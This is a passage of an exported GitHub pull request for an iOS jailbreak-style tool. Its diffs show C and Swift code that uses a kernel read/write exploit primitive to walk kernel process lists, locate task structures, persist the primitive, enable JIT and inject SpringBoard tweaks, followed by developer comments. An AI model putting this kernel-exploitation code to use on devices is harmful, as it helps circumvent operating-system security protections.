     sscanf(ios, "%d.%d.%d", &major, &minor, &patch);
 
@@ -122,7 +113,6 @@ void init_offsets(void) {
     printf("(utils) TASK_TNEXT_OFFSET: 0x%x\n", TASK_TNEXT_OFFSET);
     printf("(utils) THREAD_MUPCB_OFFSET: 0x%x\n", THREAD_MUPCB_OFFSET);
     printf("(utils) PROC_PID_OFFSET: 0x%x\n", PROC_PID_OFFSET);
-    printf("(utils) PROC_STRUCT_SIZE: 0x%llx\n", PROC_STRUCT_SIZE);
 }
 
 static NSString *const kkernprocoffset = @"lara.kernprocoff";
@@ -311,72 +301,52 @@ static uint64_t procbysock(void) {
     return 0;
 }
 
-uint64_t procbypid(pid_t targetpid) {
-    if (!ds_is_ready()) {
-        printf("(utils) darksword not ready\n");
+static uint64_t procbysock_hardcoded(void) {
+    uint64_t rw_pcb = ds_get_rw_socket_pcb();
+    if (!is_kptr(rw_pcb)) {
+        printf("(utils) rw_socket_pcb invalid: 0x%llx\n", rw_pcb);
         return 0;
     }
+    uint64_t rwSocketAddr = ds_kread64(rw_pcb + off_inpcb_inp_socket);
+    uint64_t current_thread = ds_kread64(rwSocketAddr + off_socket_so_background_thread);
+    uint64_t current_thread_ro = thread_get_t_tro(current_thread);
+    return ds_kread64(current_thread_ro + off_thread_ro_tro_proc);
+}
 
-    uint64_t kernprocaddr = kernprocaddress();
-    uint64_t kernproc = ds_kread64(kernprocaddr);
-
-    printf("(utils) kernel proc: 0x%llx\n", kernproc);
-
-    if (!is_kptr(kernproc)) {
-        printf("(utils) kernel proc pointer invalid\n");
+uint64_t procbypid(pid_t targetpid) {
+    if (!kernel_base) {
+        printf("(utils) darksword not ready\n");
         return 0;
     }
 
-    printf("(utils) looking for pid: %d\n", targetpid);
-
-    uint64_t currentproc = kernproc;
-    int count = 0;
-
-    while (currentproc && count < 2000) {
-
-        if (!is_kptr(currentproc)) {
-            printf("(utils) proc pointer invalid at step %d\n", count);
-            break;
-        }
-
-        uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);
-
-        if (pid == targetpid) {
-
-            char name[64] = {0};
-            ds_kread(currentproc + proc_name_offset(), name, 32);
-
-            uint32_t uid = ds_kread32(currentproc + PROC_UID_OFFSET);
-            uint32_t gid = ds_kread32(currentproc + PROC_GID_OFFSET);
-
-            printf("(utils) found proc: %s (pid=%d uid=%d gid=%d) @ 0x%llx\n",
-                   name, pid, uid, gid, currentproc);
-
-            return currentproc;
-        }
-
-        uint64_t next = ds_kread64(currentproc + proc_next_offset());
-
-        if (!is_kptr(next) || next == currentproc) {
-            printf("(utils) proc list ended at step %d\n", count);
-            break;
-        }
-
-        currentproc = next;
-        count++;
+    uint64_t proc = proc_self();
+    while (1) {
+        uint32_t curPid = ds_kread32(proc + off_proc_p_pid);
+        if (curPid == targetpid)
+            return proc;
+        proc = ds_kread64(proc + off_proc_p_list_le_next);
+        if(!proc) break;
+    }
+    
+    proc = proc_self();
+    while (1) {
+        uint32_t curPid = ds_kread32(proc + off_proc_p_pid);
+        if (curPid == targetpid)
+            return proc;
+        proc = ds_kread64(proc + off_proc_p_list_le_prev);
+        if(!proc) return 0;    // not found
     }
-
-    printf("(utils) pid %d not found after %d iterations\n", targetpid, count);
-    return 0;
+    
+    return proc;
 }
 
 uint64_t ourproc(void) {
-    uint64_t proc = procbypid(getpid());
+    uint64_t proc = procbysock();
     if (proc != 0) {
         return proc;
     }
 
-    proc = procbysock();
+    proc = procbysock_hardcoded();
     if (proc != 0) {
         return proc;
     }
@@ -404,12 +374,23 @@ uint64_t ourproc(void) {
 }
 
 uint64_t taskbyproc(uint64_t procaddr) {
-    if (!procaddr) return 0;
-    return procaddr + PROC_STRUCT_SIZE;
+    uint64_t p_proc_ro = ds_kread64(procaddr + off_proc_p_proc_ro);
+    uint64_t pr_task = ds_kread64(p_proc_ro + off_proc_ro_pr_task);
+    return pr_task;
 }
 
-uint64_t procbyname(const char *procname) {
-    if (!procname || strlen(procname) == 0) {
+char procNameTmp[40];
+char* proc_get_p_name(uint64_t proc) {
+    if(!proc)   return NULL;
+    memset(procNameTmp, 0, 40);
+    // Fix unaligned read panic. TODO: move to early_kread
+    uint64_t off = off_proc_p_name & 0x7;
+    ds_kreadbuf(proc + off_proc_p_name - off, &procNameTmp, 40);
+    return procNameTmp + off;
+}
+
+uint64_t procbyname(const char *name) {
+    if (!name || strlen(name) == 0) {
         printf("(utils) invalid process name\n");
         return 0;
     }
@@ -419,47 +400,25 @@ uint64_t procbyname(const char *procname) {
         return 0;
     }
 
-    uint64_t kernprocaddr = kernprocaddress();
-    uint64_t kernproc = ds_kread64(kernprocaddr);
-
-    if (!is_kptr(kernproc)) {
-        printf("(utils) kernel proc pointer invalid\n");
-        return 0;
-    }
-
-    printf("(utils) looking for process: %s\n", procname);
-
-    uint64_t currentproc = kernproc;
-    int count = 0;
-
-    while (currentproc && count < 2000) {
-        if (!is_kptr(currentproc)) {
-            break;
-        }
-
-        char name[64] = {0};
-        ds_kread(currentproc + proc_name_offset(), name, 32);
-
-        if (strcmp(name, procname) == 0) {
-
-            uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);
-            printf("(utils) resolved %s -> pid %d\n", procname, pid);
-
-            return procbypid(pid);
-        }
-
-        uint64_t next = ds_kread64(currentproc + proc_next_offset());
-
-        if (!is_kptr(next) || next == currentproc) {
-            break;
-        }
-
-        currentproc = next;
-        count++;
+    uint64_t proc = proc_self();
+    while (1) {
+        char *p_name = proc_get_p_name(proc);
+        if(p_name != NULL && strcmp(p_name, name) == 0)
+            return proc;
+        proc = ds_kread64(proc + off_proc_p_list_le_next);
+        if(!proc) break;
+    }
+    
+    proc = proc_self();
+    while (1) {
+        char *p_name = proc_get_p_name(proc);
+        if(p_name != NULL && strcmp(p_name, name) == 0)
+            return proc;
+        proc = ds_kread64(proc + off_proc_p_list_le_prev);
+        if(!proc) return 0;    // not found
     }
-
-    printf("(utils) process '%s' not found\n", procname);
-    return 0;
+    
+    return proc;
 }
 
 proc_entry_t* proclist(const char *search, int *out_count) {
@@ -681,6 +640,13 @@ uint64_t proc_find_by_name(const char* name) {
 static uint64_t gSelfProc = 0;
 static uint64_t gSelfTask = 0;
 
+bool recover_proc_self(uint64_t proc) {
+    printf("launchd proc: 0x%llx\n", proc);
+    gSelfProc = proc;
+    gSelfProc = procbypid(getpid());
+    return gSelfProc != 0;
+}
+
 uint64_t proc_self(void) {
     if (!gSelfProc) {
         gSelfProc = ourproc();
  ```

  </details>
- 🟡 `lara/views/ContentView.swift` (modified) — +1 / -9
  <details><summary>Diff</summary>

  ```diff
  @@ -11,7 +11,7 @@ import UniformTypeIdentifiers
 struct ContentView: View {
     @AppStorage("showfmintabs") private var showfmintabs: Bool = true
     @ObservedObject private var mgr = laramgr.shared
-    @State private var hasoffsets = haskernproc()
+    @State private var hasoffsets = true
     @State private var showsettings = false
     @State private var selectedmethod: method = .hybrid
 
@@ -72,14 +72,6 @@ struct ContentView: View {
                                 .foregroundColor(.secondary)
                         }
 
-                        HStack {
-                            Text("rootvnode:")
-                            Spacer()
-                            Text(String(format: "0x%llx", getkernproc()))
-                                .font(.system(.body, design: .monospaced))
-                                .foregroundColor(.secondary)
-                        }
-
                         if mgr.dsready {
                             HStack {
                                 Text("kernel_base:")
  ```

  </details>
- 🟡 `lara/views/JitView.swift` (modified) — +1 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -176,7 +176,7 @@ struct JitView: View {
 	        let runEnable: () -> Void = {
 	            DispatchQueue.global(qos: .userInitiated).async {
 	                let err: Int32 = bundleID.withCString { cStr in
-	                    enable_jit(cStr)
+                        enable_jit(mgr.sbProc, cStr)
 	                }
 	                DispatchQueue.main.async {
 	                    if err == 0 {
  ```

  </details>
- 🟡 `lara/views/RemoteView.swift` (modified) — +13 / -3
  <details><summary>Diff</summary>

  ```diff
  @@ -25,7 +25,7 @@ struct RemoteView: View {
 
                 Button {
                     run("Status Bar Time Format") {
-                        status_bar_tweak()
+                        status_bar_tweak(mgr.sbProc)
                         return "status_bar_tweak() done"
                     }
                 } label: {
@@ -35,7 +35,7 @@ struct RemoteView: View {
 
                 Button {
                     run("Hide Icon Labels") {
-                        let hidden = hide_icon_labels()
+                        let hidden = hide_icon_labels(mgr.sbProc)
                         return "hide_icon_labels() -> \(hidden)"
                     }
                 } label: {
@@ -61,13 +61,23 @@ struct RemoteView: View {
 
                 Button {
                     run("Apply Dock Columns=\(dockColumns)") {
-                        let result = set_dock_icon_count(Int32(dockColumns))
+                        let result = set_dock_icon_count(mgr.sbProc, Int32(dockColumns))
                         return "set_dock_icon_count(\(dockColumns)) -> \(result)"
                     }
                 } label: {
                     Text("Apply Dock Columns")
                 }
                 .disabled(!mgr.remotecallrunning || isRunning)
+
+                Button {
+                    run("Enable Upside Down") {
+                        let result = enable_upside_down(mgr.sbProc)
+                        return "enable_upside_down() -> \(result)"
+                    }
+                } label: {
+                    Text("Enable Upside Down")
+                }
+                .disabled(!mgr.remotecallrunning || isRunning)
             } header: {
                 Text("SpringBoard")
             } footer: {
  ```

  </details>
- 🟡 `lara/views/SettingsView.swift` (modified) — +1 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -378,7 +378,7 @@ struct SettingsView: View {
             Button("Cancel", role: .cancel) {}
             Button("Delete", role: .destructive) {
                 clearkerncachedata()
-                hasoffsets = haskernproc()
+                //hasoffsets = haskernproc()
             }
         } message: {
             Text("This will delete the downloaded kernelcache and remove saved offsets.")
  ```

  </details>


---

## Timeline (Verbose)

- : 📝 Commit 2c9e13b: Refactor RemoteCall to OOP to allow attaching to multiple processes
- : 📝 Commit 23a88d1: Replace offset-dependent functions with wh1te4ever's offsetless functions, add persistence
- : 📝 Commit 423fd32: Fix recover self proc when recovering krw
- : 📝 Commit 5ea022e: Add kread validation in recover_krw_primitives
- : 📝 Commit 56ebe41: Add upsidedown tweak
- Apr 19, 2026: ✏️ @khanhduytran0 renamed: "RemoteCall refactor, attempt to persist krw primitive" → "RemoteCall refactor, attempt to persist krw primitive, upside down tweak"
- Apr 19, 2026: 🟣 @rooootdev merged
- Apr 19, 2026: 🔴 Closed by @rooootdev


---

## Comments (2)

### Comment #1 — [@TheDiamondSquidy](https://github.com/TheDiamondSquidy) · Apr 19, 2026

`ID: 4275835290`


Good stuff! Would this help with the panics on ios17 when closing lara?


---

### Comment #2 — [@khanhduytran0](https://github.com/khanhduytran0) · Apr 19, 2026

`ID: 4276208140`


> Good stuff! Would this help with the panics on ios17 when closing lara?

I haven’t looked into it yet, but I assume there is some faulty cleanup path not yet done properly, since wh1te4ever’s implementation doesn’t have this issue(?). This might still help if it doesn’t panic on first exploit on boot.

On top of this, I have included another SpringBoard tweak, based on [upsidedowned](https://github.com/34306/upsidedowned/blob/main/Tweak.xm) hooks. It’s not very complete since it doesn’t work on Home Screen yet(?)


👍 1


---

*Exported on 10/14/2026, 2:56:57 PM from [https://github.com/rooootdev/lara/pull/131](https://github.com/rooootdev/lara/pull/131)*
